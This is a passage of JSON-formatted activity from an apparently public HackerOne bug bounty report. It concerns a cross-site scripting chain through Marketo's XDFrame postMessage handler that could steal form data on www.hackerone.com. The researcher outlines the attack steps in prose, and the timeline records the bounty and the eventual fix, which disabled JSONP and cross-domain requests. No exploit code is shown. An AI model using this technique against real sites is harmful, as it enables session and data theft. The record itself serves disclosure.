endpoint would actually solve this? Seems like not the optimal fix to me at all...","markdown_message":"\u003cp\u003eMarketo provided this update today:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eOur Engineering team has confirmed that they are updating our systems to allow customers to set custom CORS headers for their landing pages and forms.\u003c/p\u003e\n\n\u003cp\u003eThe planned release is currently set for our Q2 release. \u003c/p\u003e\n\n\u003cp\u003eYou can track the release via:\u003cbr\u003e\n\u003ca title=\"http://docs.marketo.com/display/public/DOCS/2017+Release+Schedule\" href=\"/redirect?url=http%3A%2F%2Fdocs.marketo.com%2Fdisplay%2Fpublic%2FDOCS%2F2017%2BRelease%2BSchedule\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://docs.marketo.com/display/public/DOCS/2017+Release+Schedule\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003e\u003ca href=\"/fransrosen\"\u003e@fransrosen\u003c/a\u003e, do you feel that allowing us to disable CORS for their endpoint would actually solve this? Seems like not the optimal fix to me at all...\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-11T06:11:09.328Z","updated_at":"2017-05-11T06:11:09.328Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1667387,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"That's interesting. It doesn't sound like that will solve anything regarding this issue, but it depends on what they mean with `set custom CORS headers`. I mean, if that will restrict what params to allow to be sent using `postMessage` to `$.ajax`, that would mitigate the first step in my PoC, limiting getting the XSS on the marketo.com-domain. \n\nHowever, I would assume that is not what they mean.\n\nIn my PoC above, there's nothing that abuses too open CORS-headers, I use postMessage to Marketo to XSS one iframe, launching www.hackerone.com from it, giving me cross window-access to the Marketo-iframe on www.hackerone.com. Allowing me, due to the first XSS, to also XSS the iframe on www.hackerone.com taking over the `postMessage`-listener to steal the data. \n\nHope you can make them understand this might not be a sufficient patch.","markdown_message":"\u003cp\u003eThat\u0026#39;s interesting. It doesn\u0026#39;t sound like that will solve anything regarding this issue, but it depends on what they mean with \u003ccode\u003eset custom CORS headers\u003c/code\u003e. I mean, if that will restrict what params to allow to be sent using \u003ccode\u003epostMessage\u003c/code\u003e to \u003ccode\u003e$.ajax\u003c/code\u003e, that would mitigate the first step in my PoC, limiting getting the XSS on the marketo.com-domain. \u003c/p\u003e\n\n\u003cp\u003eHowever, I would assume that is not what they mean.\u003c/p\u003e\n\n\u003cp\u003eIn my PoC above, there\u0026#39;s nothing that abuses too open CORS-headers, I use postMessage to Marketo to XSS one iframe, launching \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.hackerone.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e from it, giving me cross window-access to the Marketo-iframe on \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.hackerone.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Allowing me, due to the first XSS, to also XSS the iframe on \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.hackerone.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e taking over the \u003ccode\u003epostMessage\u003c/code\u003e-listener to steal the data. \u003c/p\u003e\n\n\u003cp\u003eHope you can make them understand this might not be a sufficient patch.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-11T06:46:24.412Z","updated_at":"2017-05-11T06:46:24.412Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1693378,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I provided your feedback to Marketo, but haven't heard anything back from them. Will poke again.","markdown_message":"\u003cp\u003eI provided your feedback to Marketo, but haven\u0026#39;t heard anything back from them. Will poke again.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-22T23:21:26.977Z","updated_at":"2017-05-22T23:21:26.977Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1694057,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"While Marketo hasn't yet fixed the issue (and it's unfortunate that it is taking them this long), we want to go ahead and award a bounty based on what we understand the severity of the issue and how it affects us.\n\nAs always, we are super appreciative of the creativity and thoroughness of your reports, and we welcome many more future reports like this.\n\nHappy hacking! :)","markdown_message":"\u003cp\u003eWhile Marketo hasn\u0026#39;t yet fixed the issue (and it\u0026#39;s unfortunate that it is taking them this long), we want to go ahead and award a bounty based on what we understand the severity of the issue and how it affects us.\u003c/p\u003e\n\n\u003cp\u003eAs always, we are super appreciative of the creativity and thoroughness of your reports, and we welcome many more future reports like this.\u003c/p\u003e\n\n\u003cp\u003eHappy hacking! :)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-23T06:59:10.586Z","updated_at":"2017-05-23T06:59:10.586Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"HackerOne"}},"bounty_amount":"1500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"security","collaborator":{"username":"fransrosen","url":"/fransrosen"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1708338,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot guys! Looking forward to getting this resolved and published :)","markdown_message":"\u003cp\u003eThanks a lot guys! Looking forward to getting this resolved and published :)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-29T23:09:41.185Z","updated_at":"2017-05-29T23:09:41.185Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1767713,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @fransrosen,\n\nI wanted to let you know we're still waiting for Marketo, sorry for the long wait!","markdown_message":"\u003cp\u003eHey \u003ca href=\"/fransrosen\"\u003e@fransrosen\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eI wanted to let you know we\u0026#39;re still waiting for Marketo, sorry for the long wait!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-20T08:43:27.223Z","updated_at":"2017-06-20T08:43:27.223Z","actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1773027,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks Dirk, looking forward to getting this stuff fixed.. :)","markdown_message":"\u003cp\u003eThanks Dirk, looking forward to getting this stuff fixed.. :)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-21T22:44:08.776Z","updated_at":"2017-06-21T22:44:08.776Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1951038,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\nI noticed the XDFrame was now updated to:\n\n```js\nvar params = { type:\"POST\", dataType:\"json\", url:p.url, data:p.data, crossDomain:false, jsonp:false };\n```\n\nIf I'm not mistaken, this means that only the message sending the data through postMessage will be able to decide where the POST-data is sent, and we're not able to utilize JSONP to trigger an XSS on the marketo-domain, as it's disabled in the ajax-params. I would call this a proper fix!\n\nTook a while, but finally!","markdown_message":"\u003cp\u003eHi,\u003cbr\u003e\nI noticed the XDFrame was now updated to:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eparams\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ePOST\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"na\"\u003edataType\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ejson\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"na\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"na\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"na\"\u003ecrossDomain\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"na\"\u003ejsonp\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e \u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf I\u0026#39;m not mistaken, this means that only the message sending the data through postMessage will be able to decide where the POST-data is sent, and we\u0026#39;re not able to utilize JSONP to trigger an XSS on the marketo-domain, as it\u0026#39;s disabled in the ajax-params. I would call this a proper fix!\u003c/p\u003e\n\n\u003cp\u003eTook a while, but finally!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-24T06:44:53.235Z","updated_at":"2017-08-24T06:44:53.235Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1951668,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@fransrosen,\n\nThank you very much for the awesome report and for confirming the fix. We extend our apologies for the long delay which was due to circumstances beyond our control. Your effort is appreciated and we wish that you'll continue to research and submit any future security issues you find.\n\nRegards.\n@joystick ","markdown_message":"\u003cp\u003e\u003ca href=\"/fransrosen\"\u003e@fransrosen\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you very much for the awesome report and for confirming the fix. We extend our apologies for the long delay which was due to circumstances beyond our control. Your effort is appreciated and we wish that you\u0026#39;ll continue to research and submit any future security issues you find.\u003c/p\u003e\n\n\u003cp\u003eRegards.\u003cbr\u003e\n\u003ca href=\"/joystick\"\u003e@joystick\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-24T11:59:19.187Z","updated_at":"2017-08-24T11:59:19.187Z","actor":{"username":"joystick","cleared":false,"url":"/joystick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/167/228/0840eb314aa099d9369d475d9ef9ba6299e83822_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"fransrosen","url":"/fransrosen"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1951671,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Awesome, since they now have a fix in place, I would love to get it out there if possible.","markdown_message":"\u003cp\u003eAwesome, since they now have a fix in place, I would love to get it out there if possible.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-24T12:02:13.799Z","updated_at":"2017-08-24T12:02:13.799Z","first_to_agree":true,"actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1963233,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-29T14:58:40.230Z","updated_at":"2017-08-29T14:58:40.230Z","actor":{"username":"jjoos","cleared":false,"url":"/jjoos","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/059/21840b8ea35224c071947ddcac0b9eb0801e0235_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1963234,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-29T14:58:40.308Z","updated_at":"2017-08-29T14:58:40.308Z","actor":{"username":"jjoos","cleared":false,"url":"/jjoos","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/059/21840b8ea35224c071947ddcac0b9eb0801e0235_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}